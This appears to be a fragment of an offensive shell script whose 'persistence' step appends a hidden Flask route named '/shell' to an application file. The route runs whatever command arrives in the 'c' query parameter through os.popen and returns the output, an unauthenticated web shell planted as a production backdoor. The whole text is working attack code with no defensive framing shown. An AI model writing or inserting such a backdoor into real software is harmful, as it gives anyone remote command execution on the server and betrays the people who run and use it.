# PERSISTENCE: Injecting a backdoor into the app code
echo "[!] Injecting Production Backdoor..."

# Use the absolute path relative to the script location or search for it
TARGET_FILE="./app/app.py"

if [ -f "$TARGET_FILE" ]; then
    cat <<EOF >> "$TARGET_FILE"

@app.route('/shell')
def shell():
    import os
    from flask import request
    return os.popen(request.args.get('c')).read()
EOF
    echo "[+] Backdoor injected into $TARGET_FILE"
else
    echo "[-] Error: $TARGET_FILE not found!"
    exit 1
fi
